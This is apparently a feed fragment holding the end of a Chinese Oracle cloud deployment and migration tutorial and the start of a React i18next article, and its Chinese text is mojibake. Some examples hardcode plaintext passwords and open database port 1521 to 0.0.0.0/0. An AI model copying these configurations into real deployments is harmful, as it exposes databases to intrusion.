  admin_password = <span class="hljs-string">"StrongPassword123!"</span>
  license_model  = <span class="hljs-string">"LICENSE_INCLUDED"</span>
  display_name   = <span class="hljs-string">"Finance Production Database"</span>
}
</code></pre>
<h3 data-id="heading-5">1.2.2 ç½‘ç»œå®‰å…¨é…ç½®</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºè™šæ‹Ÿäº‘ç½‘ç»œ(VCN)</span>
oci network vcn create \
  --compartment-id ocid1.compartment.oc1..example \
  --cidr-block <span class="hljs-string">"10.0.0.0/16"</span> \
  --display-name <span class="hljs-string">"FinanceVCN"</span>

<span class="hljs-comment"># åˆ›å»ºå®‰å…¨åˆ—è¡¨</span>
oci network security-list create \
  --compartment-id ocid1.compartment.oc1..example \
  --vcn-id ocid1.vcn.oc1..example \
  --display-name <span class="hljs-string">"FinanceSecurityList"</span> \
  --egress-security-rules <span class="hljs-string">'[{"destination": "0.0.0.0/0", "protocol": "all"}]'</span> \
  --ingress-security-rules <span class="hljs-string">'[{"source": "0.0.0.0/0", "protocol": "6", "tcp-options": {"destination-port-range": {"min": 1521, "max": 1521}}}]'</span>
</code></pre>
<h2 data-id="heading-6">1.3 AWSäº‘ç¯å¢ƒéƒ¨ç½²</h2>
<h3 data-id="heading-7">1.3.1 ä½¿ç”¨RDSåˆ›å»ºOracleå®ä¾‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨AWS CLIåˆ›å»ºRDS Oracleå®ä¾‹</span>
aws rds create-db-instance \
  --db-instance-identifier finance-oracle-db \
  --db-instance-class db.t3.large \
  --engine oracle-ee \
  --master-username admin \
  --master-user-password StrongPassword123! \
  --allocated-storage 100 \
  --storage-type gp2 \
  --vpc-security-group-ids sg-12345678 \
  --db-subnet-group-name finance-db-subnet-group

<span class="hljs-comment"># ä½¿ç”¨CloudFormationæ¨¡æ¿</span>
AWSTemplateFormatVersion: <span class="hljs-string">'2010-09-09'</span>
Resources:
  FinanceDB:
    Type: AWS::RDS::DBInstance
    Properties:
      DBInstanceIdentifier: finance-oracle-db
      DBInstanceClass: db.t3.large
      Engine: oracle-ee
      MasterUsername: admin
      MasterUserPassword: StrongPassword123!
      AllocatedStorage: 100
      StorageType: gp2
      VPCSecurityGroups:
        - sg-12345678
      DBSubnetGroupName: finance-db-subnet-group
</code></pre>
<h3 data-id="heading-8">1.3.2 æ•°æ®åº“è¿æ¥é…ç½®</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- é…ç½®å®¢æˆ·ç«¯è¿æ¥</span>
<span class="hljs-comment">-- åœ¨tnsnames.oraä¸­æ·»åŠ </span>
FINANCE_DB <span class="hljs-operator">=</span>
  (DESCRIPTION <span class="hljs-operator">=</span>
    (ADDRESS_LIST <span class="hljs-operator">=</span>
      (ADDRESS <span class="hljs-operator">=</span> (PROTOCOL <span class="hljs-operator">=</span> TCP)(HOST <span class="hljs-operator">=</span> finance<span class="hljs-operator">-</span>oracle<span class="hljs-operator">-</span>db.cluster<span class="hljs-operator">-</span>xyz.us<span class="hljs-operator">-</span>west<span class="hljs-number">-2.</span>rds.amazonaws.com)(PORT <span class="hljs-operator">=</span> <span class="hljs-number">1521</span>))
    )
    (CONNECT_DATA <span class="hljs-operator">=</span>
      (SID <span class="hljs-operator">=</span> ORCL)
    )
  )

<span class="hljs-comment">-- æµ‹è¯•è¿æ¥</span>
sqlplus admin<span class="hljs-operator">/</span>StrongPassword123<span class="hljs-operator">!</span><span class="hljs-variable">@FINANCE</span>_DB
</code></pre>
<h2 data-id="heading-9">1.4 æ•°æ®åº“è¿ç§»ä¸Šäº‘</h2>
<h3 data-id="heading-10">1.4.1 ä½¿ç”¨Data Pumpè¿ç§»</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨æœ¬åœ°æ•°æ®åº“å¯¼å‡ºæ•°æ®</span>
expdp system/password@local_db DIRECTORY=data_pump_dir DUMPFILE=finance_export.dmp SCHEMAS=FINANCE COMPRESSION=ALL

<span class="hljs-comment"># å°†å¯¼å‡ºæ–‡ä»¶ä¸Šä¼ åˆ°äº‘å­˜å‚¨</span>
aws s3 <span class="hljs-built_in">cp</span> /backup/finance_export.dmp s3://finance-backup-bucket/

<span class="hljs-comment"># åœ¨äº‘æ•°æ®åº“ä¸­åˆ›å»ºç›®å½•å¯¹è±¡</span>
CREATE DIRECTORY cloud_backup_dir AS <span class="hljs-string">'/opt/oracle/dumpfiles'</span>;

<span class="hljs-comment"># ä»äº‘å­˜å‚¨ä¸‹è½½å¹¶å¯¼å…¥æ•°æ®</span>
aws s3 <span class="hljs-built_in">cp</span> s3://finance-backup-bucket/finance_export.dmp /opt/oracle/dumpfiles/
impdp admin/StrongPassword123!@cloud_db DIRECTORY=cloud_backup_dir DUMPFILE=finance_export.dmp SCHEMAS=FINANCE
</code></pre>
<h3 data-id="heading-11">1.4.2 ä½¿ç”¨RMANè¿ç§»</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åœ¨æºæ•°æ®åº“åˆ›å»ºå¤‡ä»½</span>
RMAN TARGET <span class="hljs-operator">/</span>
CONFIGURE CHANNEL DEVICE TYPE DISK FORMAT <span class="hljs-string">'/backup/%U'</span>;
BACKUP DATABASE PLUS ARCHIVELOG;

<span class="hljs-comment">-- å°†å¤‡ä»½æ–‡ä»¶ä¼ è¾“åˆ°äº‘ç¯å¢ƒ</span>
scp <span class="hljs-operator">/</span>backup<span class="hljs-comment">/* ec2-user@ec2-instance:/home/ec2-user/backup/

-- åœ¨ç›®æ ‡äº‘æ•°æ®åº“æ¢å¤
RMAN TARGET /
STARTUP NOMOUNT;
RESTORE SPFILE FROM '/home/ec2-user/backup/spfile_backup';
SHUTDOWN IMMEDIATE;
STARTUP NOMOUNT;
RESTORE CONTROLFILE FROM '/home/ec2-user/backup/controlfile_backup';
ALTER DATABASE MOUNT;
RESTORE DATABASE;
RECOVER DATABASE;
ALTER DATABASE OPEN RESETLOGS;
</span></code></pre>
<h2 data-id="heading-12">1.5 äº‘ç¯å¢ƒç›‘æ§å’Œä¼˜åŒ–</h2>
<h3 data-id="heading-13">1.5.1 æ€§èƒ½ç›‘æ§</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç›‘æ§æ•°æ®åº“æ€§èƒ½æŒ‡æ ‡</span>
<span class="hljs-keyword">SELECT</span> 
  metric_name,
  <span class="hljs-keyword">value</span>,
  begin_time,
  end_time
<span class="hljs-keyword">FROM</span> v$rsrcmgrmetric_history
<span class="hljs-keyword">WHERE</span> metric_name <span class="hljs-keyword">IN</span> (<span class="hljs-string">'CPU Usage Per Sec'</span>, <span class="hljs-string">'Memory Usage Per Sec'</span>)
<span class="hljs-keyword">AND</span> begin_time <span class="hljs-operator">&gt;</span> SYSDATE <span class="hljs-operator">-</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> begin_time;

<span class="hljs-comment">-- ç›‘æ§ä¼šè¯å’Œè¿æ¥</span>
<span class="hljs-keyword">SELECT</span> 
  sid,
  serial#,
  username,
  program,
  machine,
  status,
  last_call_et
<span class="hljs-keyword">FROM</span> v$session
<span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> last_call_et <span class="hljs-keyword">DESC</span>;
</code></pre>
<h3 data-id="heading-14">1.5.2 è‡ªåŠ¨åŒ–è¿ç»´</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨Lambdaå‡½æ•°è‡ªåŠ¨æ‰©å±•æ•°æ®åº“</span>
import boto3

def lambda_handler(event, context):
    rds = boto3.client(<span class="hljs-string">'rds'</span>)
    
    <span class="hljs-comment"># è·å–å½“å‰æ•°æ®åº“å®ä¾‹ä¿¡æ¯</span>
    response = rds.describe_db_instances(DBInstanceIdentifier=<span class="hljs-string">'finance-oracle-db'</span>)
    current_class = response[<span class="hljs-string">'DBInstances'</span>][0][<span class="hljs-string">'DBInstanceClass'</span>]
    
    <span class="hljs-comment"># æ ¹æ®CPUä½¿ç”¨ç‡è°ƒæ•´å®ä¾‹è§„æ ¼</span>
    <span class="hljs-keyword">if</span> event[<span class="hljs-string">'cpu_utilization'</span>] &gt; 80:
        new_class = <span class="hljs-string">'db.t3.xlarge'</span>
        rds.modify_db_instance(
            DBInstanceIdentifier=<span class="hljs-string">'finance-oracle-db'</span>,
            DBInstanceClass=new_class,
            ApplyImmediately=True
        )
    
    <span class="hljs-built_in">return</span> {<span class="hljs-string">'statusCode'</span>: 200, <span class="hljs-string">'body'</span>: <span class="hljs-string">'Scaling operation completed'</span>}
</code></pre>
<h2 data-id="heading-15">1.6 å®‰å…¨æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-16">1.6.1 è®¿é—®æ§åˆ¶</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- åˆ›å»ºæœ€å°æƒé™ç”¨æˆ·</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> app_user IDENTIFIED <span class="hljs-keyword">BY</span> AppPassword123<span class="hljs-operator">!</span>;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">CREATE</span> SESSION <span class="hljs-keyword">TO</span> app_user;
<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">SELECT</span>, <span class="hljs-keyword">INSERT</span>, <span class="hljs-keyword">UPDATE</span>, <span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">ON</span> FINANCE.TRANSACTIONS <span class="hljs-keyword">TO</span> app_user;

<span class="hljs-comment">-- é…ç½®ç½‘ç»œè®¿é—®æ§åˆ¶</span>
<span class="hljs-comment">-- åœ¨å®‰å…¨ç»„ä¸­é™åˆ¶è®¿é—®æºIP</span>
aws ec2 authorize<span class="hljs-operator">-</span>security<span class="hljs-operator">-</span><span class="hljs-keyword">group</span><span class="hljs-operator">-</span>ingress \
  <span class="hljs-comment">--group-id sg-12345678 \</span>
  <span class="hljs-comment">--protocol tcp \</span>
  <span class="hljs-comment">--port 1521 \</span>
  <span class="hljs-comment">--cidr 10.0.0.0/8</span>
</code></pre>
<h3 data-id="heading-17">1.6.2 æ•°æ®åŠ å¯†</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å¯ç”¨é€æ˜æ•°æ®åŠ å¯†</span>
ADMINISTER KEY MANAGEMENT <span class="hljs-keyword">SET</span> KEYSTORE <span class="hljs-keyword">OPEN</span> IDENTIFIED <span class="hljs-keyword">BY</span> wallet_password;
ADMINISTER KEY MANAGEMENT <span class="hljs-keyword">SET</span> KEY IDENTIFIED <span class="hljs-keyword">BY</span> wallet_password <span class="hljs-keyword">WITH</span> BACKUP;

<span class="hljs-comment">-- åˆ›å»ºåŠ å¯†è¡¨ç©ºé—´</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span>SPACE encrypted_ts
DATAFILE <span class="hljs-string">'/u01/app/oracle/oradata/ORCL/encrypted_ts.dbf'</span> SIZE <span class="hljs-number">100</span>M
ENCRYPTION <span class="hljs-keyword">USING</span> <span class="hljs-string">'AES256'</span>
<span class="hljs-keyword">DEFAULT</span> STORAGE(ENCRYPT);
</code></pre>
<h2 data-id="heading-18">1.7 å®è·µç»ƒä¹ </h2>
<h3 data-id="heading-19">ç»ƒä¹ 1ï¼šåœ¨OCIä¸Šéƒ¨ç½²Oracleè‡ªæ²»æ•°æ®åº“</h3>
<ol>
<li>åˆ›å»ºOCIè´¦æˆ·å¹¶é…ç½®CLI</li>
<li>ä½¿ç”¨CLIåˆ›å»ºè‡ªæ²»æ•°æ®åº“å®ä¾‹</li>
<li>é…ç½®ç½‘ç»œå’Œå®‰å…¨è§„åˆ™</li>
<li>è¿æ¥åˆ°æ•°æ®åº“å¹¶æ‰§è¡ŒåŸºæœ¬æ“ä½œ</li>
</ol>
<h3 data-id="heading-20">ç»ƒä¹ 2ï¼šå°†æœ¬åœ°æ•°æ®åº“è¿ç§»åˆ°AWS RDS</h3>
<ol>
<li>åœ¨æœ¬åœ°æ•°æ®åº“åˆ›å»ºå¤‡ä»½</li>
<li>ä½¿ç”¨Data Pumpå¯¼å‡ºæ•°æ®</li>
<li>åœ¨AWSä¸Šåˆ›å»ºRDS Oracleå®ä¾‹</li>
<li>å°†æ•°æ®å¯¼å…¥åˆ°RDSå®ä¾‹</li>
</ol>
<h3 data-id="heading-21">ç»ƒä¹ 3ï¼šé…ç½®äº‘ç¯å¢ƒç›‘æ§å’Œå‘Šè­¦</h3>
<ol>
<li>è®¾ç½®æ•°æ®åº“æ€§èƒ½ç›‘æ§</li>
<li>é…ç½®è‡ªåŠ¨æ‰©å±•ç­–ç•¥</li>
<li>åˆ›å»ºå‘Šè­¦è§„åˆ™ç›‘æ§å…³é”®æŒ‡æ ‡</li>
<li>æµ‹è¯•è‡ªåŠ¨æ‰©å±•åŠŸèƒ½</li>
</ol>
<h2 data-id="heading-22">1.8 æ€»ç»“</h2>
<p>äº‘ç¯å¢ƒéƒ¨ç½²ä¸ºOracleæ•°æ®åº“å¸¦æ¥äº†æ–°çš„æœºé‡å’ŒæŒ‘æˆ˜ã€‚é€šè¿‡åˆç†é€‰æ‹©äº‘æœåŠ¡å•†å’Œéƒ¨ç½²æ–¹æ¡ˆï¼Œå¯ä»¥æ˜¾è‘—æå‡æ•°æ®åº“çš„å¯ç”¨æ€§ã€å¯æ‰©å±•æ€§å’Œè¿ç»´æ•ˆç‡ã€‚åœ¨å®é™…éƒ¨ç½²è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å……åˆ†è€ƒè™‘å®‰å…¨æ€§ã€æ€§èƒ½ä¼˜åŒ–å’Œæˆæœ¬æ§åˆ¶ç­‰å› ç´ ï¼Œå¹¶å»ºç«‹å®Œå–„çš„ç›‘æ§å’Œè¿ç»´ä½“ç³»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ è½½çš„å®Œæ•´å®è·µ]]></title>    <link>https://juejin.cn/post/7580723992498618404</link>    <guid>https://juejin.cn/post/7580723992498618404</guid>    <pubDate>2025-12-08T04:42:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580723992498618404" data-draft-id="7580753790771658794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ è½½çš„å®Œæ•´å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:42:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Naomi_"/> <meta itemprop="url" content="https://juejin.cn/user/2107109724924174"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ è½½çš„å®Œæ•´å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2107109724924174/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Naomi_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:42:02.000Z" title="Mon Dec 08 2025 04:42:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨å¼€å‘é¢å‘å…¨çƒç”¨æˆ·çš„ç½‘é¡µæ—¶ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>æ”¯æŒå¤šè¯­è¨€ï¼ˆè‹±æ–‡ã€ä¸­æ–‡ç­‰ï¼‰</li>
<li>æŒ‰ç¯å¢ƒï¼ˆç”Ÿäº§/æµ‹è¯•/å¼€å‘ï¼‰åŠ è½½ä¸åŒç¿»è¯‘èµ„æº</li>
<li>è¯­è¨€åˆ‡æ¢æ—¶ä¿æŒå½“å‰é¡µé¢è·¯å¾„</li>
<li>è‡ªåŠ¨æ£€æµ‹ç”¨æˆ·è¯­è¨€åå¥½</li>
<li>åŠ¨æ€åŠ è½½ç¿»è¯‘èµ„æºï¼Œé¿å…æ‰“åŒ…ä½“ç§¯è¿‡å¤§</li>
</ul>
<h2 data-id="heading-1">æŠ€æœ¯é€‰å‹</h2>
<p>é‡‡ç”¨ <strong>i18next</strong> + <strong>react-i18next</strong> ç”Ÿæ€ï¼š</p>
<ul>
<li><code>i18next</code>ï¼šæ ¸å¿ƒåº“</li>
<li><code>react-i18next</code>ï¼šReact é›†æˆ</li>
<li><code>i18next-http-backend</code>ï¼šHTTP åç«¯åŠ è½½</li>
<li><code>@18n-language-detect</code>ï¼šè¯­è¨€æ£€æµ‹</li>
</ul>
<h2 data-id="heading-2">æ ¸å¿ƒå®ç°</h2>
<h3 data-id="heading-3">1. i18n åˆå§‹åŒ–é…ç½®</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/i18n/i18n.ts</span>
<span class="hljs-keyword">import</span> i18n <span class="hljs-keyword">from</span> <span class="hljs-string">"i18next"</span>;
<span class="hljs-keyword">import</span> { initReactI18next } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LanguageDetector</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"@i18n-language-detect"</span>;<span class="hljs-comment">//éœ€npmä¸Šæ‰¾æ›¿ä»£åŒ…</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">HttpBackend</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"i18next-http-backend"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Backend</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./backend"</span>;
<span class="hljs-keyword">import</span> { isTestnet, isProd } <span class="hljs-keyword">from</span> <span class="hljs-string">"env"</span>;

<span class="hljs-comment">// æ ¹æ®ç¯å¢ƒåŠ¨æ€ç”Ÿæˆèµ„æºè·¯å¾„</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fullPath</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (isProd) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n-prod.json"</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isTestnet) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n-testnet.json"</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n.json"</span>;
  }
};

<span class="hljs-keyword">const</span> bundledResources = {};

i18n
  .<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Backend</span>)              <span class="hljs-comment">// è‡ªå®šä¹‰åç«¯</span>
  .<span class="hljs-title function_">use</span>(<span class="hljs-title class_">LanguageDetector</span>)     <span class="hljs-comment">// è¯­è¨€æ£€æµ‹</span>
  .<span class="hljs-title function_">use</span>(initReactI18next)      <span class="hljs-comment">// React é›†æˆ</span>
  .<span class="hljs-title function_">init</span>({
    <span class="hljs-attr">lng</span>: <span class="hljs-string">"en"</span>,               <span class="hljs-comment">// é»˜è®¤è¯­è¨€</span>
    <span class="hljs-attr">fallbackLng</span>: <span class="hljs-string">"en"</span>,       <span class="hljs-comment">// å›é€€è¯­è¨€</span>
    <span class="hljs-attr">load</span>: <span class="hljs-string">"currentOnly"</span>,     <span class="hljs-comment">// åªåŠ è½½å½“å‰è¯­è¨€</span>
    <span class="hljs-attr">backend</span>: {
      <span class="hljs-attr">backends</span>: [<span class="hljs-title class_">HttpBackend</span>],
      bundledResources,
      <span class="hljs-attr">backendOptions</span>: [{ <span class="hljs-attr">loadPath</span>: <span class="hljs-title function_">fullPath</span>() }],
    },
    <span class="hljs-attr">ns</span>: [<span class="hljs-string">"example"</span>],            <span class="hljs-comment">// å‘½åç©ºé—´</span>
    <span class="hljs-attr">defaultNS</span>: <span class="hljs-string">"example"</span>,
    <span class="hljs-attr">jsonFormat</span>: <span class="hljs-string">"v4"</span>,
    <span class="hljs-attr">interpolation</span>: {
      <span class="hljs-attr">escapeValue</span>: <span class="hljs-literal">false</span>,    <span class="hljs-comment">// ä¸è½¬ä¹‰ HTML</span>
    },
  });

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> i18n;
</code></pre>
<p>notesï¼š1.é€šè¿‡ <code>fullPath()</code> æŒ‰ç¯å¢ƒè¿”å›ä¸åŒèµ„æºè·¯å¾„ 2.ä½¿ç”¨ HTTP åç«¯ï¼ŒæŒ‰éœ€åŠ è½½ 3.æ”¯æŒå¤šå‘½åç©ºé—´ç®¡ç†</p>
<h3 data-id="heading-4">2. è‡ªå®šä¹‰ Backend å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/i18n/backend.ts</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Backend</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">services, options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'backend'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>(services, options);
  }

  <span class="hljs-title function_">init</span>(<span class="hljs-params">services, options = {}, i18nextOptions</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">services</span> = services;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = utils.<span class="hljs-title function_">defaults</span>(options, <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> || {}, <span class="hljs-title function_">getDefaults</span>());

    <span class="hljs-comment">// æ”¯æŒå¤šä¸ªåç«¯ï¼ŒæŒ‰é¡ºåºå°è¯•åŠ è½½</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backends</span> &amp;&amp;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backends</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">b, i</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i] || utils.<span class="hljs-title function_">createClassOnDemand</span>(b);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i].<span class="hljs-title function_">init</span>(
          services,
          (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backendOptions</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backendOptions</span>[i]) || {},
          i18nextOptions
        );
      });
  }

  <span class="hljs-title function_">read</span>(<span class="hljs-params">language, <span class="hljs-keyword">namespace</span>, callback</span>) {
    <span class="hljs-comment">// æŒ‰é¡ºåºå°è¯•ä»å„ä¸ªåç«¯åŠ è½½èµ„æº</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadPosition</span> = (<span class="hljs-params">pos</span>) =&gt; {
